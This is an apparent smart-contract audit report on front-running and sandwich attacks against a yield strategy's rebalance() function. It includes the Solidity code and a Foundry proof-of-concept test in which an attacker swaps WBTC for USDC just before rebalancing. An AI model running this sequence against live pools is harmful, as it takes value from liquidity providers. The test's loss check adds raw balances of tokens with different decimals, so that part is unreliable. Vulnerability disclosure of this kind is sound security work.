# Front-Running Vulnerability in Strategy Rebalancing

### Summary

The [`Strategy::rebalance()`](https://github.com/sherlock-audit/2025-02-yieldoor/blob/main/yieldoor/src/Strategy.sol#L198) function is vulnerable to sophisticated front-running and sandwich attacks, allowing malicious actors to extract value by predicting and manipulating liquidity removal and addition transactions.

### Root Cause

In `Strategy.sol`, the `rebalance()` function publicly removes and adds liquidity without robust protection against market manipulation:

```solidity
function rebalance() public onlyRebalancer {
    require(block.timestamp - lastRebalance >= rebalanceInterval, "too soon since last rebalance");

    _requirePriceWithinRange();
    collectFees();

    _removeLiquidity();
    (uint256 amount0, uint256 amount1) = idleBalances();

    (uint160 sqrtPriceX96, int24 tick,,,,,) = IUniswapV3Pool(pool).slot0();

    _setMainTicks(tick);
    (amount0, amount1) = _addLiquidityToMainPosition(sqrtPriceX96, amount0, amount1);

    _setSecondaryPositionsTicks(tick);
    _addLiquidityToSecondaryPosition(sqrtPriceX96, amount0, amount1);
    lastRebalance = block.timestamp;
}
```

### Internal Pre-conditions

1. Rebalancer must be trusted entity
2. Rebalance interval must have passed
3. Pool price must be within acceptable range

### External Pre-conditions

1. Sufficient market liquidity
2. Active MEV bot ecosystem
3. Predictable rebalance intervals

### Attack Path

1. Attacker monitors pending rebalance transaction
2. Executes a swap to manipulate pool price
3. Forces strategy to rebalance at unfavorable rates
4. Extracts value through price manipulation
5. Profits from liquidity repositioning

### Impact

- Potential value extraction from liquidity providers
- Reduced strategy performance
- Undermines the economic efficiency of the rebalancing mechanism

```solidity
function test_rebalanceFrontRunning() public {
    vm.startPrank(rebalancer);

    uint256 initialTotalValue;
    {
        (uint256 bal0, uint256 bal1) = IStrategy(strategy).balances();
        initialTotalValue = bal0 + bal1;
    }

    vm.startPrank(attacker);
    uint160 currentSqrtPrice;
    int24 currentTick;
    (currentSqrtPrice, currentTick,,,,,) = IUniswapV3Pool(pool).slot0();

    IMainnetRouter.ExactInputSingleParams memory swapParams;
    swapParams.tokenIn = address(wbtc);
    swapParams.tokenOut = address(usdc);
    swapParams.fee = 3000;
    swapParams.amountIn = 1e8;
    swapParams.recipient = attacker;
    swapParams.deadline = block.timestamp;

    deal(address(wbtc), attacker, 1e8);
    wbtc.approve(uniRouter, 1e8);
    IMainnetRouter(uniRouter).exactInputSingle(swapParams);

    vm.startPrank(rebalancer);
    IStrategy(strategy).rebalance();

    uint256 finalTotalValue;
    {
        (uint256 bal0, uint256 bal1) = IStrategy(strategy).balances();
        finalTotalValue = bal0 + bal1;
    }

    assertLt(finalTotalValue, initialTotalValue);
}
```

### Mitigation

1. Use private transaction networks (Flashbots)
2. Add dynamic slippage protection
